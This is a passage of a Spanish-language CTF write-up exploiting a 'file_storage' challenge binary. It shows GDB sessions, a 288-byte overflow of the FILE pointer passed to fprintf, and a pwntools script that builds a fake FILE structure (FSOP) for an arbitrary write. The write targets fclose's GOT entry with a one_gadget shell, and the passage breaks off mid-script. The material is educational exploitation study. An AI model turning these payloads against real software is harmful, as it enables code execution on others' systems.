aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa  
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-red">gef➤  </span>run
Starting program: ./file_storage
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 2
Enter content:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa

Breakpoint 1, <span class="code-dark-blue">0x0000000000401789</span> in <span class="code-dark-yellow">main</span> ()
</code></pre></div><p>Alcanzamos al <em>breakpoint</em>. Ahora podemos ver el <em>offset</em> para sobrescribir el puntero <code>FILE</code> que se pasa a <code>fprintf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;
<span class="code-green">gef➤  </span>x/gx $rdi
<span class="code-dark-blue">0x626161616161616c</span>:     Cannot access memory at address 0x626161616161616c  
<span class="code-green">gef➤  </span>x/gx $rsi
<span class="code-dark-blue">0x40212e</span>:       0x626d756e00732520
<span class="code-green">gef➤  </span>x/gx $rdx
<span class="code-dark-blue">0x7fffffffe5a0</span>: 0x6161616161616161
</code></pre></div><p>Vemos que hemos sobrescrito <code>$rdi</code> con algunos caracteres del patrón, por lo que podemos controlar la dirección del puntero <code>FILE</code> (<code>fp</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>pattern offset $rdi
<span class="code-blue">[+]</span> Searching for '6c61616161616162'/'626161616161616c' with period=8  
<span class="code-green">[+]</span> Found at offset 288 (little-endian search) <span class="code-red">likely</span>
<span class="code-green">gef➤  </span>quit
</code></pre></div><p>Perfecto, ahora la idea es ingresar un puntero a una dirección en la pila que contiene una estructura <code>FILE</code> falsa que escribirá datos arbitrarios en una dirección específica de memoria.</p><p>Solo para probar, deshabilitamos a ASLR para facilitar las tareas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
[sudo] password for rocky:
0
</code></pre></div><p>Ahora visualicemos una estructura normal del tipo <code>FILE</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">file_storage</span>
Reading symbols from <span class="code-dark-green">file_storage</span>...
(No debugging symbols found in <span class="code-dark-green">file_storage</span>)  
<span class="code-red">gef➤  </span>break *main+741
Breakpoint 1 at <span class="code-dark-blue">0x401789</span>
<span class="code-red">gef➤  </span>run
Starting program: ./file_storage
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 2
Enter content:
AAAA

Breakpoint 1, <span class="code-dark-blue">0x0000000000401789</span> in <span class="code-dark-yellow">main</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/30gx $rdi
<span class="code-dark-blue">0x4056b0</span>:       0x00000000fbad2484      0x0000000000000000  
<span class="code-dark-blue">0x4056c0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4056d0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4056e0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4056f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405700</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405710</span>:       0x0000000000000000      0x00007ffff7fc45c0
<span class="code-dark-blue">0x405720</span>:       0x0000000000000003      0x0000000000000000
<span class="code-dark-blue">0x405730</span>:       0x0000000000000000      0x0000000000405790
<span class="code-dark-blue">0x405740</span>:       0xffffffffffffffff      0x0000000000000000
<span class="code-dark-blue">0x405750</span>:       0x00000000004057a0      0x0000000000000000
<span class="code-dark-blue">0x405760</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405770</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405780</span>:       0x0000000000000000      0x00007ffff7fc04a0
<span class="code-dark-blue">0x405790</span>:       0x0000000000000000      0x0000000000000000
<span class="code-green">gef➤  </span>p *(FILE*) $rdi
$1 = {
  _flags = 0xfbad2484,
  _IO_read_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_read_end = <span class="code-dark-blue">0x0</span>,
  _IO_read_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_write_end = <span class="code-dark-blue">0x0</span>,
  _IO_buf_base = <span class="code-dark-blue">0x0</span>,
  _IO_buf_end = <span class="code-dark-blue">0x0</span>,
  _IO_save_base = <span class="code-dark-blue">0x0</span>,
  _IO_backup_base = <span class="code-dark-blue">0x0</span>,
  _IO_save_end = <span class="code-dark-blue">0x0</span>,
  _markers = <span class="code-dark-blue">0x0</span>,
  _chain = <span class="code-dark-blue">0x7ffff7fc45c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>&gt;,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = <span class="code-dark-blue">0x405790</span>,
  _offset = 0xffffffffffffffff,
  _codecvt = <span class="code-dark-blue">0x0</span>,
  _wide_data = <span class="code-dark-blue">0x4057a0</span>,
  _freeres_list = <span class="code-dark-blue">0x0</span>,
  _freeres_buf = <span class="code-dark-blue">0x0</span>,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' &lt;repeats 19 times&gt;
}
<span class="code-green">gef➤  </span>x 0x00007ffff7fa74a0
<span class="code-dark-blue">0x7ffff7fa74a0</span>: 0x0000000dfff983c0
</code></pre></div><p>La forma de explotar esta estructura <code>FILE</code> para lograr una primitiva de escritura arbitraria es agregar una determinada dirección en <code>_IO_buf_base</code> (y la misma dirección más <code>8</code> en <code>_IO_buf_end</code>). Más información en <a href="https://4ngelboy.blogspot.com/2017/11/play-with-file-structure-yet-another.html">angelboy.tw</a>.</p><p>Por ejemplo, podemos intentar modificar el nombre de una variable de entorno cargada en la pila:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep USER
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">USER</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffeea7 - 0x7fffffffeeb1  →   "<span class="code-dark-magenta">USER=rocky</span>"
</code></pre></div><p>Dado que ASLR está deshabilitado temporalmente, esta dirección será estática. Actualicemos el <em>script</em> de Python y agreguemos GDB al proceso:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">_lock</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3">#_lock = 0x405790   (Just a writable address, i.e. stack)</span>  

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">fbad2484</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_2_1_stderr_</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">3</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">_lock</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xff</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">_lock</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_file_jumps</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">payload</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk3"># ...</span>

<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break *main+741</span><span class="mtk6">\n</span><span class="mtk4">continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">288</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffeeed</span>, <span class="mtk7 mtki">0x</span><span class="mtk6">405790</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(yes/no): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'yes'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>La función llamada <code>fsop</code> creará la estructura <code>FILE</code> falsa. Alternativamente, podemos usar <a href="https://docs.pwntools.com/en/stable/filepointer.html"><code>FileStructure</code> de <code>pwntools</code></a>.</p><p>Todavía no sabemos la dirección en la que se colocará la estructura <code>FILE</code> maliciosa, por lo que estamos utilizando una dirección ficticia <code>BBBBBBBB</code>. Si lo ejecutamos, podemos continuar hasta que lleguemos al <em>breakpoint</em>, justo antes de <code>fprintf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep USER
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">USER</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffeeed - 0x7fffffffeef7  →   "<span class="code-dark-magenta">USER=rocky</span>"
<span class="code-green">gef➤  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;
<span class="code-green">gef➤  </span>x/gx $rdi
<span class="code-dark-blue">0x4242424242424242</span>:     Cannot access memory at address 0x4242424242424242  
<span class="code-green">gef➤  </span>x/gx $rsi
<span class="code-dark-blue">0x40212e</span>:       0x626d756e00732520
<span class="code-green">gef➤  </span>x/gx $rdx
<span class="code-dark-blue">0x7fffffffe600</span>: 0x5858585858585858
<span class="code-green">gef➤  </span>x/30gx $rdx
<span class="code-dark-blue">0x7fffffffe600</span>: 0x5858585858585858      0x00000000fbad2484
<span class="code-dark-blue">0x7fffffffe610</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe620</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe630</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe640</span>: 0x00007fffffffeed6      0x00007fffffffeede
<span class="code-dark-blue">0x7fffffffe650</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe660</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe670</span>: 0x00007ffff7fc45c0      0x0000000000000003
<span class="code-dark-blue">0x7fffffffe680</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe690</span>: 0x0000000000405790      0xffffffffffffffff
<span class="code-dark-blue">0x7fffffffe6a0</span>: 0x0000000000000000      0x00000000004057a0
<span class="code-dark-blue">0x7fffffffe6b0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe6c0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe6d0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe6e0</span>: 0x00007ffff7fc04a0      0x4141414141414141
</code></pre></div><p>En este punto, vemos que la estructura <code>FILE</code> falsa se coloca en <code>0x7fffffffe608</code> en la pila. Nótese también que la dirección de la variable de entorno cambió al ejecutar GDB a través del <em>exploit</em> de Python. Ahora, podemos reemplazar <code>BBBBBBBB</code> por <code>p64(0x7fffffffe608)</code> y volver a ejecutar el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep USER
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">USER</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffeeed - 0x7fffffffeef7  →   "<span class="code-dark-magenta">USER=rocky</span>"
<span class="code-green">gef➤  </span>x/s 0x7fffffffeeed
<span class="code-dark-blue">0x7fffffffeeed</span>: "USER=rocky"
<span class="code-green">gef➤  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x401789</span> &lt;<span class="code-dark-yellow">main</span>+741&gt;: call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;  
<span class="code-green">gef➤  </span>x/gx $rdi
<span class="code-dark-blue">0x7fffffffe608</span>: 0x00000000fbad2484
<span class="code-green">gef➤  </span>x/gx $rdx
<span class="code-dark-blue">0x7fffffffe600</span>: 0x5858585858585858
<span class="code-green">gef➤  </span>p *(FILE *) $rdi
$1 = {
  _flags = 0xfbad2484,
  _IO_read_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_read_end = <span class="code-dark-blue">0x0</span>,
  _IO_read_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_base = <span class="code-dark-blue">0x0</span>,
  _IO_write_ptr = <span class="code-dark-blue">0x0</span>,
  _IO_write_end = <span class="code-dark-blue">0x0</span>,
  _IO_buf_base = <span class="code-dark-blue">0x7fffffffeeed</span> "USER=rocky",
  _IO_buf_end = <span class="code-dark-blue">0x7fffffffeef5</span> "ky",
  _IO_save_base = <span class="code-dark-blue">0x0</span>,
  _IO_backup_base = <span class="code-dark-blue">0x0</span>,
  _IO_save_end = <span class="code-dark-blue">0x0</span>,
  _markers = <span class="code-dark-blue">0x0</span>,
  _chain = <span class="code-dark-blue">0x7ffff7fc45c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>&gt;,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = <span class="code-dark-blue">0x405790</span>,
  _offset = 0xffffffffffffffff,
  _codecvt = <span class="code-dark-blue">0x0</span>,
  _wide_data = <span class="code-dark-blue">0x4057a0</span>,
  _freeres_list = <span class="code-dark-blue">0x0</span>,
  _freeres_buf = <span class="code-dark-blue">0x0</span>,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' &lt;repeats 19 times&gt;
}
<span class="code-green">gef➤  </span>ni
<span class="code-dark-blue">0x000000000040178e</span> in <span class="code-dark-yellow">main</span> ()
</code></pre></div><p>La estructura <code>FILE</code> parece correcta. Y de hecho, la variable de entorno ha cambiado (de <code>USER=rocky</code> a <code>XXXXXXXXky</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/s 0x7fffffffeeed
<span class="code-dark-blue">0x7fffffffeeed</span>: "XXXXXXXXky"  
</code></pre></div><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Perfecto, tenemos una primitiva de escritura. Ahora podemos intentar cambiar una entrada de la GOT. Después de <code>fprintf</code> solo tenemos llamadas a <code>fclose</code>, <code>puts</code>, <code>sleep</code>, <code>system</code> y <code>exit</code>.</p><p>La idea es sobrescribir <code>fclose</code> en la GOT con una <em>shell</em> <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a>, que se puede hacer con un solo <em>payload</em> de FSOP.</p><p>Elegimos modificar <code>fclose</code> porque el <code>fclose</code> legítimo fallará dado que la estructura <code>FILE</code> no es completamente válida (se bloqueará con un error <code>invalid free() pointer</code>). Por lo tanto, la mejor idea es sobrescribir la entrada de la GOT para <code>fclose</code> con la dirección de una <em>shell</em> <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">one_gadget</span> <span class="mtku">libc.so.6</span>
<span class="rb-purple">0xe3afe</span> execve("/bin/sh", <span class="rb-dark-green">r15</span>, <span class="rb-dark-green">r12</span>)  
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">r15</span>] == NULL || <span class="rb-dark-green">r15</span> == NULL
  [<span class="rb-dark-green">r12</span>] == NULL || <span class="rb-dark-green">r12</span> == NULL

<span class="rb-purple">0xe3b01</span> execve("/bin/sh", <span class="rb-dark-green">r15</span>, <span class="rb-dark-green">rdx</span>)
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">r15</span>] == NULL || <span class="rb-dark-green">r15</span> == NULL
  [<span class="rb-dark-green">rdx</span>] == NULL || <span class="rb-dark-green">rdx</span> == NULL

<span class="rb-purple">0xe3b04</span> execve("/bin/sh", <span class="rb-dark-green">rsi</span>, <span class="rb-dark-green">rdx</span>)
<span class="rb-red">constraints</span>:
  [<span class="rb-dark-green">rsi</span>] == NULL || <span class="rb-dark-green">rsi</span> == NULL
  [<span class="rb-dark-green">rdx</span>] == NULL || <span class="rb-dark-green">rdx</span> == NULL
</code></pre></div><h3 id="sin-aslr">Sin ASLR</h3><p>Por el momento, vamos a modificar la GOT. Este es el <em>exploit</em> actualizado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">_lock</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk3"># ...</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">288</span>
<span class="mtk1">    </span><span class="mtk1">one_gadgets</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">0x</span><span class="mtk6">e3afe</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b01</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b04</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">one_gadgets</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">])</span>  
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.fclose, </span><span class="mtk7 mtki">0x</span><span class="mtk6">405790</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'<span class="mtk6">\0</span>'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe538</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(yes/no): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'yes'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


